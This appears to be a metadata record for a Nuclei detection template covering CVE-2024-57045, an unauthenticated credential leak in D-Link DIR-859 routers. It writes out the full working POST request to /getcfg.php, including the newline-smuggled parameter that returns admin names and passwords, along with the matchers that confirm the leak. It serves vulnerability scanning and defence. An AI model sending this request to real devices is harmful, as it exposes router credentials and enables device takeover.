---
cve_id: CVE-2024-57045
template_path: nuclei-templates/http/cves/2024/CVE-2024-57045.yaml
affected_product: D-Link DIR-859
severity: critical
authentication: none
external_callback: false
affected_versions: unknown
preconditions: []
poc_classification: info-leak
---

## Vulnerability
Critical unauthenticated information disclosure (CVE-2024-57045) in D-Link DIR-859 routers. Sensitive device account information, including administrative credentials, can be retrieved by sending a POST request to the `/getcfg.php` endpoint with `SERVICES=DEVICE.ACCOUNT`. 

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (9.8). CWE-200.

Impact: attackers obtain admin credentials enabling full device compromise.

## PoC / Detection
Classification: info-leak

The template sends the following unauthenticated POST request:
```
POST /getcfg.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

SERVICES=DEVICE.ACCOUNT%0aAUTHORIZED_GROUP=1
```
It detects the leak by matching on:
- HTTP status 200
- Content-Type containing `text/xml`
- Response body containing all of `<name>`, `<password>`, `<account>`

## References
- https://www.dlink.com/en/security-bulletin
- https://nvd.nist.gov/vuln/detail/CVE-2024-57045
